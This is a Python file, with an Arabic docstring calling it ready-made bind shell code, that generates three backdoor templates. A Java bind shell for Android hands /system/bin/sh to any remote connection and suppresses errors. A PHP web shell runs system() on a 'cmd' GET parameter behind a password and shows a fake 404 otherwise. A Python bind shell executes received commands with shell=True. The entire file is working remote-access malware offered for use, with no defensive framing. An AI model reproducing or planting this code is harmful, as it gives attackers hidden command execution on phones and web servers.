#!/usr/bin/env python3
"""
أكواد Bind Shell جاهزة
"""

# Java Bind Shell
JAVA_BIND_SHELL = """
package com.example.app;

import java.io.*;
import java.net.*;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class BindShellServer {
    private static final int PORT = {PORT};
    private static ExecutorService threadPool = Executors.newCachedThreadPool();
    private static boolean running = true;
    
    public static void start() {
        new Thread(new Runnable() {
            public void run() {
                try {
                    ServerSocket serverSocket = new ServerSocket(PORT);
                    serverSocket.setReuseAddress(true);
                    
                    System.out.println("[*] Bind Shell listening on port " + PORT);
                    
                    while (running) {
                        Socket clientSocket = serverSocket.accept();
                        threadPool.execute(new ClientHandler(clientSocket));
                    }
                    
                    serverSocket.close();
                    
                } catch (IOException e) {
                    // Silent
                }
            }
        }).start();
    }
    
    public static void stop() {
        running = false;
        threadPool.shutdown();
    }
    
    static class ClientHandler implements Runnable {
        private Socket socket;
        
        ClientHandler(Socket socket) {
            this.socket = socket;
        }
        
        public void run() {
            try {
                String clientIP = socket.getInetAddress().getHostAddress();
                System.out.println("[+] Connection from " + clientIP);
                
                // Send banner
                OutputStream os = socket.getOutputStream();
                PrintWriter pw = new PrintWriter(os, true);
                pw.println("Android Bind Shell - Connected");
                pw.println("Device: " + android.os.Build.MODEL);
                pw.println("Android: " + android.os.Build.VERSION.RELEASE);
                pw.println("Shell: /system/bin/sh");
                pw.print("$ ");
                
                // Start shell
                Process process = Runtime.getRuntime().exec("/system/bin/sh");
                InputStream processInput = process.getInputStream();
                InputStream processError = process.getErrorStream();
                OutputStream processOutput = process.getOutputStream();
                
                // Handle I/O
                BufferedReader reader = new BufferedReader(new InputStreamReader(socket.getInputStream()));
                String command;
                
                while ((command = reader.readLine()) != null) {
                    if (command.equalsIgnoreCase("exit")) {
                        break;
                    }
                    
                    // Execute command
                    processOutput.write((command + "\\n").getBytes());
                    processOutput.flush();
                    
                    // Read output
                    Thread.sleep(100); // Wait for output
                    
                    byte[] buffer = new byte[1024];
                    int bytesRead;
                    
                    while (processInput.available() > 0) {
                        bytesRead = processInput.read(buffer);
                        socket.getOutputStream().write(buffer, 0, bytesRead);
                    }
                    
                    while (processError.available() > 0) {
                        bytesRead = processError.read(buffer);
                        socket.getOutputStream().write(buffer, 0, bytesRead);
                    }
                    
                    pw.print("$ ");
                    pw.flush();
                }
                
                // Cleanup
                process.destroy();
                socket.close();
                System.out.println("[-] Connection closed: " + clientIP);
                
            } catch (Exception e) {
                // Silent
            }
        }
    }
}
"""

# PHP Bind Shell (for web servers)
PHP_BIND_SHELL = """<?php
// PHP Bind Shell
$port = {PORT};
$password = "{PASSWORD}";

if (isset($_GET['pass']) && $_GET['pass'] == $password) {
    if (isset($_GET['cmd'])) {
        system($_GET['cmd']);
    } else {
        echo "PHP Bind Shell Ready\\n";
    }
} else {
    header("HTTP/1.0 404 Not Found");
}
?>
"""

# Python Bind Shell
PYTHON_BIND_SHELL = """#!/usr/bin/env python3
import socket, subprocess, os, threading

def handle_client(client_socket):
    try:
        client_socket.send(b"Android Python Bind Shell\\n")
        
        while True:
            client_socket.send(b"$ ")
            command = client_socket.recv(1024).decode().strip()
            
            if command.lower() == "exit":
                break
            
            try:
                output = subprocess.check_output(
                    command, 
                    shell=True, 
                    stderr=subprocess.STDOUT
                )
                client_socket.send(output)
            except Exception as e:
                client_socket.send(str(e).encode())
                
    except Exception as e:
        pass
    finally:
        client_socket.close()

def start_bind_shell(port={PORT}):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(("0.0.0.0", port))
    server.listen(5)
    
    print(f"[*] Bind shell listening on port {port}")
    
    while True:
        client, addr = server.accept()
        print(f"[+] Connection from {addr[0]}:{addr[1]}")
        client_handler = threading.Thread(target=handle_client, args=(client,))
        client_handler.start()

if __name__ == "__main__":
    start_bind_shell()
"""

def get_bind_shell_code(shell_type="java", port=5555, password="password123"):
    """
    Get bind shell code by type
    """
    if shell_type == "java":
        return JAVA_BIND_SHELL.replace("{PORT}", str(port))
    elif shell_type == "php":
        return PHP_BIND_SHELL.replace("{PORT}", str(port)).replace("{PASSWORD}", password)
    elif shell_type == "python":
        return PYTHON_BIND_SHELL.replace("{PORT}", str(port))
    else:
        return JAVA_BIND_SHELL.replace("{PORT}", str(port))

if __name__ == "__main__":
    print("Java Bind Shell Sample:")
    print(get_bind_shell_code("java", 5555)[:300] + "...")